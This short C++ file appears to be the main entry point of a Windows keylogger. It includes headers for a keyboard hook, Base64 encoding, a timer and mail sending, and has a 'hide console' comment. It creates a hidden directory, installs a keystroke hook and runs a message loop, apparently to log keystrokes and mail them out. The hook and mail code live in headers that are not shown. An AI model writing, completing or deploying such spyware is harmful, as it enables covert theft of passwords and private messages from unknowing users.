#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "keyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include "scp.h"

using namespace std;

int main()
{
    //hide console
    Helper::WriteAppLog("testing..");
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    while(GetMessage(&Msg,NULL,0,0)){
        TranslateMessage(&Msg);//take message
        DispatchMessage(&Msg);//forward message to the system
    }

    MailTimer.Stop();
    return 0;
}
